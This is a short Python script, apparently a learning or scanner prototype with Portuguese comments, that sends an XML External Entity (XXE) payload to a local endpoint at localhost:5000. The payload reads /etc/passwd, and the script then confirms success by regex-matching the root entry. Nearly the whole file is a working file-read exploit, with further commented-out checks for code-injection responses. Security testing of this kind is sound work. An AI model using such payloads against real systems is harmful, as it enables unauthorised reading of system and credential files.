import requests
import time
import json 
import re

def runSearchExploit():
    url = "http://localhost:5000/xml"

    # payload_read_file_01 = ('<?xml version="1.0" encoding="UTF-8"?>' +
    #                 '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>' +
    #                 '<stockCheck><productId>&xxe;</productId></stockCheck>')

    payload_read_file_01 = '<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>'


    print(payload_read_file_01)
    # payload = {'xml':  '<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>' }
    payload = {'xml': '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId></stockCheck>'}
    # headers = ('Content-type text/html; charset=utf-8');


    response = requests.post(url, data=payload_read_file_01, headers={'Content-type' : 'text/html; charset=utf-8'})
    print(response.content)
    
    content = bytes.decode(response.content, 'utf-8')

    padraoPython_read_file_01 = r'\broot:x:0:0:root\b'

    if response.status_code == 200:
        print('deu bom', bytes.decode(response.content, 'utf-8'))
        
        matched_pyload_read_file_01 = re.search(padraoPython_read_file_01, content)
        print("Matched: ", matched_pyload_read_file_01.group())




    # mockReturnPython = "ACACIO"
    # mockReturnJavaScript = "Function() { [native code] }"

    # mockOnPython = False
    # mockOnJavaScript = True

    # if mockOnPython == True:
    #     content = mockReturnPython
    # elif mockOnJavaScript == True:
    #     content = mockReturnJavaScript
    # else:
    #     content = bytes.decode(response.content, 'utf-8')

    # if mockOnPython or mockOnJavaScript or response.status_code == 200:
    #     padraoPython = r'\bACACIO\b'
    #     padraoJavaScript = re.escape("Function() { [native code] }")

    #     matchedPython = re.search(padraoPython, content)
    #     matchedJavaScript = re.search(padraoJavaScript, content)

    #     if matchedPython:
    #         print('Vulnerabilidade em Pyton')  
    #         print("Matched: ", matchedPython.group())
    #     elif matchedJavaScript:
    #         print('Vulnerabilidade em JavaScript')
    #         print("Matched: ", matchedJavaScript.group())

runSearchExploit()
